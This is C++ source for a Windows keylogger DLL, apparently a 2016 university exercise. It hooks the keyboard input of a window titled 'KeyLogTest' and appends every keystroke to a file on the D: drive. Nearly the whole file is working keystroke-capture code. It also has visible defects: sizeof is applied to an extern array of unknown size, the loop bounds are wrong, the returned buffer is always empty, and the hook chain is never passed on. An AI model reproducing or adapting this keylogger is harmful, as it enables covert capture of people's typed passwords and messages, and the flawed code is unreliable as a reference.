/**
 * @author Haoguang Xu
 * 
 * Copyright (c) 2016, UCAS
 * All rights reserved. 
 * 
 * Hook.cpp //制作Hook.dll
 */
 
#include "windows.h"
#include"stdio.h"
#include <io.h>  
#include <fcntl.h> 
#include "keyInfo.h"

HHOOK g_hKeyBoard; //全局键盘HOOK
extern const KeyName g_KeyNames[]; //键盘信息
FILE *fp; //存放键盘记录信息的文件

/**
* 根据按键事件来查找按键信息
* 
* @param VK：按键编号
		 capsLock：大写是否开启
* @return char*
*/
char* findKetName(int VK, int capsLock)
{
    static char buf[128]={0};
    int i=0;
    fp = fopen("D:\\logfile.txt","a+"); //打开存放键盘记录信息的文件，操作类型为"a+"（追加）

    for(i=0;i<sizeof(g_KeyNames);i++)
    {
        if(i == VK)
        {   if(i>=64 && i<=90 && capsLock == 0){
				fprintf(fp,"%c ",i+32); //输入的是小写字母
			}else 
				fprintf(fp,"%s ",g_KeyNames[i].name);

        }
    }

	fclose(fp); //关闭文件
	
    return buf; //返回按信息
}

/**
 * 钩子回调函数
 * 
 * @param nCode：Hook代码
		  wParam： 消息标示，用于判断该消息是那种消息，如WM_MOUSEMOVE，WM_NCMOUSEMOVE
		  lParam：包含所钩消息的信息指针，比如鼠标位置、状态，键盘按键等
 * @return 回调函数
 */

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode == HC_ACTION)
    {
        if( !(lParam & 0x80000000)) //按键按下 要加判断否则键盘消息会回响应两次(键盘按下和弹起)
        {
			unsigned char buf[256];
			GetKeyboardState(buf); //获取键盘的按键状态

			if(buf[VK_CAPITAL]&1) //键盘大写开启
				findKetName(wParam, 1);
			else 
				findKetName(wParam, 0);
        }
    }
	return 0;
}

/**
 * 给应用程序挂钩子
 * @return void
 */
void setHook(){


	HWND hWnd = FindWindow(NULL,"KeyLogTest"); //根据KeyLogTest找到指定应用程序的窗口句柄
    
    DWORD ProcessID;
	DWORD ThreadID;
	
    ThreadID = GetWindowThreadProcessId(hWnd, &ProcessID); //找到进程ID
	
    g_hKeyBoard = SetWindowsHookEx(WH_KEYBOARD,HookProc,GetModuleHandle("Hook"),ThreadID); //根据Hook.dll和进程ID给应用程序挂键盘钩子

}